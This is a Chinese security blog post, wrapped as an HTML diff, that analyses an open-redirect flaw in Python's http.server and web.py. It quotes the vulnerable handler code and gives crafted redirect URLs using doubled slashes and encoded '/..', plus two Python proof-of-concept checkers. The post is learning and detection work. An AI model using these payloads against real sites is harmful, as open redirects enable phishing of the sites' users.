@@ -1,0 +1,1273 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透,URL跳转,WEB安全,python安全," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demos's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="python: http.server / web.py URL跳转漏洞实践 前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。  HTTP.SERVER python一键启动web服务器 python -m http.server 在任意目录执行上面的命令，可">
+<meta name="keywords" content="渗透,URL跳转,WEB安全,python安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="URL跳转漏洞白盒实践">
+<meta property="og:url" content="https://www.lsowl.top/2018/11/21/URL跳转漏洞白盒实践/index.html">
+<meta property="og:site_name" content="Demos&#39;s Blog">
+<meta property="og:description" content="python: http.server / web.py URL跳转漏洞实践 前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。  HTTP.SERVER python一键启动web服务器 python -m http.server 在任意目录执行上面的命令，可">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799015.32.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799795.42.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799619.52.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800155.96.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800189.28.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807039.02.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542805858.68.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542806989.87.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807062.2.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542808635.89.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542809567.07.png">
+<meta property="og:updated_time" content="2018-11-21T14:21:26.759Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="URL跳转漏洞白盒实践">
+<meta name="twitter:description" content="python: http.server / web.py URL跳转漏洞实践 前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。  HTTP.SERVER python一键启动web服务器 python -m http.server 在任意目录执行上面的命令，可">
+<meta name="twitter:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.lsowl.top/2018/11/21/URL跳转漏洞白盒实践/"/>
+
+
+
+
+
+  <title>URL跳转漏洞白盒实践 | Demos's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Demos's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">It's A Long Road</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.lsowl.top/2018/11/21/URL跳转漏洞白盒实践/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Demos">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Demos's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">URL跳转漏洞白盒实践</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T22:18:57+08:00">
+                2018-11-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="python-http-server-web-py-URL跳转漏洞实践"><a href="#python-http-server-web-py-URL跳转漏洞实践" class="headerlink" title="python: http.server / web.py URL跳转漏洞实践"></a>python: http.server / web.py URL跳转漏洞实践</h2><blockquote>
+<p>前几天学习了URL跳转漏洞，主要是从黑盒进行测试，今天看了P牛的一篇关于python的http.server和web.py的URL跳转漏洞分析，是从白盒来进行分析测试的，现将实践记录如下。</p>
+</blockquote>
+<h3 id="HTTP-SERVER"><a href="#HTTP-SERVER" class="headerlink" title="HTTP.SERVER"></a>HTTP.SERVER</h3><ul>
+<li><p>python一键启动web服务器 <code>python -m http.server</code></p>
+<p>在任意目录执行上面的命令，可以启动一个web服务端，模拟一个服务器。这里用到了http.server这个模块</p>
+</li>
+<li><p>http.server模块下包含几个类</p>
+<ul>
+<li><code>HTTPServer</code>这个类继承于<code>socketserver.TCPServer</code>，说明其实HTTP服务器本质是一个TCP服务器</li>
+<li><code>BaseHTTPRequestHandler</code>，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作</li>
+<li><code>SimpleHTTPRequestHandler</code>，这个类继承于<code>BaseHTTPRequestHandler</code>，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。</li>
+<li><code>CGIHTTPRequestHandler</code>，这个类继承于<code>SimpleHTTPRequestHandler</code>，在静态文件服务器的基础上，增加了执行CGI脚本的功能。</li>
+</ul>
+</li>
+<li><p>http.server的几个类的关系就是下面这样（P牛的图）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542797209.49.png" alt=""></p>
+</li>
+<li><p>通过分析：SimpleHTTPRequestHandler是将用户请求的path返回给用户的，并且它继承了BaseHTTPRequestHandler类的HTTP协议解析的特性，并返回数据包，所以说明http.server这个发生URL跳转会发生在SimpleHTTPRequestHandler的代码中</p>
+</li>
+<li><p>分析SimpleHTTPRequestHandler类源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleHTTPRequestHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    server_version = <span class="string">"SimpleHTTP/"</span> + __version__</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#如果是GET请求就调用do_GET函数，在do_GET中调用了send_head函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""Serve a GET request."""</span></span><br><span class="line">        f = self.send_head()</span><br><span class="line">        <span class="keyword">if</span> f:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.copyfile(f, self.wfile)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">	</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_head</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#translate_path函数解析用户输入的请求path，判断用户真正请求的文件</span></span><br><span class="line">        path = self.translate_path(self.path)</span><br><span class="line">        f = <span class="keyword">None</span></span><br><span class="line">        <span class="comment">#判断用户的请求的文件或目录是否在web服务器的目录中，如果在则进入第一个if语  		 句，如果请求的路径不存在则跳转到web服务的主页</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">            <span class="comment">#将用户输入的请求解析过后用rllib.parse.urlsplit拆分，用于后面的判断</span></span><br><span class="line">            parts = urllib.parse.urlsplit(self.path)</span><br><span class="line">            <span class="comment">#判断用户请求的地址是否以'/'结尾，如果是则直接返回相应请求内容，如果不是			 则进入第二个if语句，将用户的请求加上'/'后进行跳转，也是漏洞点</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> parts.path.endswith(<span class="string">'/'</span>):</span><br><span class="line">                <span class="comment"># redirect browser - doing basically what apache does</span></span><br><span class="line">                self.send_response(HTTPStatus.MOVED_PERMANENTLY)</span><br><span class="line">                new_parts = (parts[<span class="number">0</span>], parts[<span class="number">1</span>], parts[<span class="number">2</span>] + <span class="string">'/'</span>,</span><br><span class="line">                             parts[<span class="number">3</span>], parts[<span class="number">4</span>])</span><br><span class="line">                new_url = urllib.parse.urlunsplit(new_parts)</span><br><span class="line">                self.send_header(<span class="string">"Location"</span>, new_url)</span><br><span class="line">                self.end_headers()</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">            <span class="keyword">for</span> index <span class="keyword">in</span> <span class="string">"index.html"</span>, <span class="string">"index.htm"</span>:</span><br><span class="line">                index = os.path.join(path, index)</span><br><span class="line">                <span class="keyword">if</span> os.path.exists(index):</span><br><span class="line">                    path = index</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> self.list_directory(path)</span><br><span class="line">        <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到漏洞点在 if not parts.path.endswith(‘/‘)后进一步分析：</p>
+<ul>
+<li>这里的代码逻辑是判断用户请求的一个已经存在的文件是不是以 ‘/’结尾的，如果不是，则加上‘/’进行301跳转。</li>
+<li>现在主流的浏览器访问 <code>//baidu.com</code> 时候会跳转到 <code>baidu.com</code> 会默认认为这个URL是当前数据包的协议，也就是说，这里要跳转，必须要构造成跳转时能解析为一个正常的域名，必须构造成 <code>127.0.0.1:8000//baidu.com</code></li>
+<li>常见的URL跳转应该是<code>127.0.0.1:8000/baidu.com</code>一个斜杠，这里为什么要两个呢；原因在parts = urllib.parse.urlsplit(self.path)这里的分割，可以看到使用双斜杠后将用户的请求解析成一个netlocation,这里就会发生跳转，产生URL跳转漏洞。<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799015.32.png" alt=""></li>
+</ul>
+</li>
+<li><p>现在触发点找到了，还有一个问题，就是初始值的判断，http.server会判断用户访问的资源站内是否存在，绕过这个限制可以让请求跳到下一级目录 <code>/..</code></p>
+</li>
+<li><p>构造payload：<code>127.0.0.1:8000//baidu.com//..</code>(请求后没有跳转到百度，而是跳转到首页，抓包分析)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799795.42.png" alt=""></p>
+<p>在浏览器直接请求127.0.0.1:8000//baidu.com//..根本不会将/..传到服务器，所以服务器收到的请求是 <code>127.0.0.1:8000//baidu.com/</code> 然后判断站点中不存在用户请求的资源</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542799619.52.png" alt=""></p>
+</li>
+<li><p>要让服务端收到的请求中包跳目录的请求，必须进行URL编码：(成功跳转，已经证明漏洞存在，这里的绕过跨目录没法控制，不能调到baidu主页，但是学习思路，证明漏洞存在已经达到目标了)</p>
+<p><code>127.0.0.1:8000//baidu.com/%2f..</code>  或 <code>127.0.0.1:8000//baidu.com/%2f%2e%2e</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800155.96.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542800189.28.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807039.02.png" alt=""></p>
+</li>
+</ul>
+<h3 id="web-py框架"><a href="#web-py框架" class="headerlink" title="web.py框架"></a>web.py框架</h3><p>继承并使用了<code>SimpleHTTPRequestHandler</code>类，web.py在处理静态文件的时候会使用SimpleHTTPRequestHandler`类，所以会受到影响</p>
+<ul>
+<li><p>简单的web.py代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/(.*)'</span>, <span class="string">'hello'</span></span><br><span class="line">)</span><br><span class="line">app = web.application(urls, globals())</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> name:</span><br><span class="line">            name = <span class="string">'World'</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Hello, '</span> + name + <span class="string">'!'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542805858.68.png" alt=""></p>
+</li>
+<li><p>模拟真实的生产环境：（web.py的应用中必须是静态文件才有效，所以必须制定css,js,图片等，原原理都是一样的，这里的@代表后面的是域名）</p>
+<p><code>http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f</code>  <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542806989.87.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542807062.2.png" alt=""></p>
+</li>
+</ul>
+<h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><ul>
+<li><p>http.server——poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="comment">#urllib.parse.urlparse代替python2中的urlparse模块中的urlparse.urlparse()方法</span></span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;//example.com/%2f%2e%2e"</span>.format(target)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    poc(sys.argv[<span class="number">1</span>])</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542808635.89.png" alt=""></p>
+</li>
+<li><p>web.py——poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    print(<span class="string">"you should provide a static resoure url, like js or css or picture!"</span>)</span><br><span class="line">    x = urllib.parse.urlparse(url)</span><br><span class="line">    <span class="comment">#将静态文件路径中的"/"转换为%2f</span></span><br><span class="line">    path_list = x.path.split(<span class="string">"/"</span>)</span><br><span class="line">    path_list.pop()</span><br><span class="line">    path_list.remove(<span class="string">""</span>)</span><br><span class="line">    path_list.append(<span class="string">""</span>)</span><br><span class="line">    path = <span class="string">"%2f"</span>.join(path_list)</span><br><span class="line">    <span class="comment"># print(path)</span></span><br><span class="line">    target =  <span class="string">"&#123;0&#125;://&#123;1&#125;"</span>.format(x.scheme,x.netloc)</span><br><span class="line">    payload = <span class="string">"&#123;0&#125;////&#123;1&#125;@www.example.com/..%2f"</span>.format(target,path)</span><br><span class="line">    print(payload)</span><br><span class="line"></span><br><span class="line">    response = requests.get(payload,allow_redirects=<span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">301</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            location = response.headers[<span class="string">"Location"</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"example.com"</span> <span class="keyword">in</span> location:</span><br><span class="line">                print(<span class="string">"sucess"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"false"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">'Start!'</span>)</span><br><span class="line">    <span class="comment"># poc(sys.argv[1])</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8080/static/css/'</span>)</span><br><span class="line">    print(<span class="string">'End!'</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542809567.07.png" alt=""></p>
+</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过一次白盒的URL跳转漏洞实践可以更好的掌握其原理，对黑盒测试也有帮助；比如这里的绕过文件判断的限制“/..”，与黑盒中的一些畸形绕过的方式就类似，学海无涯。</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-http-server-open-redirect-vulnerability.html</a></p>
+<p><a href="http://www.polaris-lab.com/index.php/tag/web-py/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/web-py/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"><i class="fa fa-tag"></i> 渗透</a>
+          
+            <a href="/tags/URL跳转/" rel="tag"><i class="fa fa-tag"></i> URL跳转</a>
+          
+            <a href="/tags/WEB安全/" rel="tag"><i class="fa fa-tag"></i> WEB安全</a>
+          
+            <a href="/tags/python安全/" rel="tag"><i class="fa fa-tag"></i> python安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/20/利用Honeyd搭建简易蜜罐/" rel="next" title="利用Honeyd搭建简易蜜罐">
+                <i class="fa fa-chevron-left"></i> 利用Honeyd搭建简易蜜罐
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/28/PHP文件写入/" rel="prev" title="PHP文件写入">
+                PHP文件写入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Demos" />
+            
+              <p class="site-author-name" itemprop="name">Demos</p>
+              <p class="site-description motion-element" itemprop="description"></p>
